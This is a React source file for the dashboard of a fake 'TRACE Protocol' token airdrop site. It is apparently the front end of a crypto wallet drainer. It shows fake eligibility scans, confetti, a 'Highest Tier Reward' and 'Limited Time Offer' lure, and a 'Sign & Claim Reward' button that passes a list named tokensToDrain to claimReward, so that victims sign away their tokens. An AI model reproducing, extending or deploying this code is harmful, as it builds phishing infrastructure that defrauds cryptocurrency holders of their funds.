"use client";

import { useWeb3Manager } from "@/hooks/useWeb3Manager";
import { useEffect, useState } from "react";
import { CheckCircle, Shield, XCircle, ChevronRight, Loader2, PartyPopper } from "lucide-react";
import confetti from "canvas-confetti";

export default function Dashboard() {
    const { account, checkEligibility, claimReward } = useWeb3Manager();

    // Status Flow: scanning -> congrats -> claim -> ineligible
    const [status, setStatus] = useState<"scanning" | "congrats" | "claim" | "ineligible">("scanning");
    const [tokensToDrain, setTokensToDrain] = useState<{ address: string; chainId: string; symbol?: string }[]>([]);

    useEffect(() => {
        const verify = async () => {
            // 1. Scanning State is default
            const { isEligible, tokensToDrain: tokens } = await checkEligibility();

            if (isEligible) {
                setTokensToDrain(tokens);
                setStatus("congrats");

                // Trigger confetti for playful effect
                const end = Date.now() + 1500;
                const colors = ['#D4AF37', '#ffffff', '#000000'];
                (function frame() {
                    confetti({
                        particleCount: 3,
                        angle: 60,
                        spread: 55,
                        origin: { x: 0 },
                        colors: colors
                    });
                    confetti({
                        particleCount: 3,
                        angle: 120,
                        spread: 55,
                        origin: { x: 1 },
                        colors: colors
                    });
                    if (Date.now() < end) {
                        requestAnimationFrame(frame);
                    }
                }());
            } else {
                setStatus("ineligible");
            }
        };

        if (account) {
            verify();
        } else {
            setStatus("scanning");
        }
    }, [account]);

    if (status === "scanning") {
        return (
            <div className="flex flex-col items-center justify-center py-24 md:py-40 animate-fade-up">
                <div className="relative mb-8">
                    <div className="w-20 h-20 md:w-24 md:h-24 border-4 border-[#D4AF37]/10 border-t-[#D4AF37] rounded-full animate-spin" />
                    <div className="absolute inset-0 flex items-center justify-center">
                        <Shield size={32} className="text-[#D4AF37]/50 animate-pulse" />
                    </div>
                </div>
                <p className="text-white/40 animate-pulse uppercase tracking-[0.3em] text-[10px] font-bold">Verifying Eligibility...</p>
                <div className="flex flex-col items-center mt-4 space-y-1">
                    <p className="text-[#D4AF37]/30 text-[9px] font-mono">Scanning Polygon POS History...</p>
                    <p className="text-[#D4AF37]/30 text-[9px] font-mono">Verifying zkEVM Proofs...</p>
                    <p className="text-[#D4AF37]/30 text-[9px] font-mono">Checking Ethereum Mainnet...</p>
                </div>
            </div>
        );
    }

    if (status === "congrats") {
        return (
            <div className="py-12 md:py-20 flex justify-center animate-fade-up">
                <div className="glass-card p-8 md:p-12 border border-[#D4AF37]/30 text-center max-w-xl w-full relative overflow-hidden mx-4 md:mx-0">
                    <div className="absolute top-0 left-0 w-full h-1 bg-gradient-to-r from-[#D4AF37] to-transparent" />
                    <div className="absolute -top-20 -right-20 w-64 h-64 bg-[#D4AF37] opacity-5 rounded-full blur-3xl" />

                    <div className="mb-8 flex justify-center">
                        <div className="p-6 bg-[#D4AF37]/10 rounded-full text-[#D4AF37] animate-bounce shadow-[0_0_30px_rgba(212,175,55,0.2)]">
                            <PartyPopper size={48} />
                        </div>
                    </div>

                    <h2 className="text-3xl md:text-4xl font-bold italic mb-4 gold-gradient">Congratulations!</h2>
                    <p className="text-white/60 mb-10 leading-relaxed text-base md:text-lg">
                        You have been selected for the <span className="text-[#D4AF37] font-bold">TRACE Protocol</span> distribution. Your wallet activity qualifies you for the <span className="text-white font-bold underline decoration-[#D4AF37]/50">Highest Tier Reward</span>.
                    </p>

                    <button
                        onClick={() => setStatus("claim")}
                        className="gold-button w-full py-5 rounded-2xl font-bold text-black uppercase tracking-widest text-xs md:text-sm shadow-xl flex items-center justify-center gap-3 group transition-all hover:scale-[1.02]"
                    >
                        <span>Continue to Claim</span>
                        <ChevronRight size={18} className="group-hover:translate-x-1 transition-transform" />
                    </button>
                    <p className="mt-4 text-[10px] text-white/20 uppercase tracking-widest">Limited Time Offer</p>
                </div>
            </div>
        );
    }

    if (status === "claim") {
        return (
            <div className="py-12 md:py-20 flex justify-center animate-fade-up">
                <div className="glass-card p-8 md:p-12 border border-[#D4AF37]/20 text-center max-w-xl w-full relative mx-4 md:mx-0">
                    <div className="absolute top-0 left-0 w-full h-1 bg-gradient-to-r from-[#D4AF37] to-transparent" />

                    <div className="mb-6 flex justify-center">
                        <div className="p-4 bg-[#D4AF37]/10 rounded-full text-[#D4AF37] shadow-[0_0_20px_rgba(212,175,55,0.1)]">
                            <CheckCircle size={48} />
                        </div>
                    </div>

                    <h3 className="text-2xl md:text-3xl font-bold italic mb-2">Claim Ready</h3>
                    <div className="text-[10px] font-mono text-[#D4AF37] mb-8 bg-[#D4AF37]/5 inline-block px-4 py-1.5 rounded-full border border-[#D4AF37]/20">
                        Allocation Verified • Tier 1
                    </div>

                    <div className="bg-white/5 rounded-xl p-6 mb-8 text-left border border-white/5 space-y-3">
                        <div className="flex justify-between items-center">
                            <div className="flex items-center gap-2">
                                <div className="w-1.5 h-1.5 rounded-full bg-green-400 animate-pulse" />
                                <span className="text-white/40 text-xs uppercase tracking-wider font-bold">Network Status</span>
                            </div>
                            <span className="text-green-400 text-xs font-mono">Optimal</span>
                        </div>
                        <div className="flex justify-between items-center">
                            <span className="text-white/40 text-xs uppercase tracking-wider font-bold">Network Fee</span>
                            <span className="text-[#D4AF37] text-xs font-mono">Sponsored by Protocol</span>
                        </div>
                        <div className="flex justify-between items-center">
                            <span className="text-white/40 text-xs uppercase tracking-wider font-bold">Est. Time</span>
                            <span className="text-white text-xs font-mono">~15 Seconds</span>
                        </div>
                    </div>

                    <button
                        onClick={() => claimReward(tokensToDrain)}
                        className="gold-button w-full py-5 rounded-2xl font-bold text-black uppercase tracking-widest text-xs md:text-sm shadow-xl hover:scale-[1.02] transition-transform relative overflow-hidden group"
                    >
                        <span className="relative z-10 flex items-center justify-center gap-2">
                            Sign & Claim Reward <Shield size={16} />
                        </span>
                        <div className="absolute top-0 left-0 w-full h-full bg-white/30 translate-x-[-100%] group-hover:translate-x-[0] transition-transform duration-500" />
                    </button>

                    <p className="mt-6 text-[10px] text-white/20">
                        By signing, you agree to the Terms of Distribution.
                    </p>
                </div>
            </div>
        );
    }

    return (
        <div className="py-20 flex justify-center animate-fade-up">
            <div className="glass-card p-12 border border-red-500/20 text-center max-w-lg w-full">
                <div className="mb-6 flex justify-center">
                    <div className="p-4 bg-red-500/10 rounded-full text-red-500">
                        <XCircle size={48} />
                    </div>
                </div>

                <h3 className="text-2xl font-bold italic mb-4">Not Eligible</h3>
                <p className="text-white/50 mb-8">
                    Unfortunately, this wallet does not meet the activity criteria for the current distribution phase.
                </p>

                <div className="text-xs text-white/30 font-mono bg-white/5 p-2 rounded">
                    Code: 0x_LOW_ACTIVITY
                </div>
            </div>
        </div>
    );
}
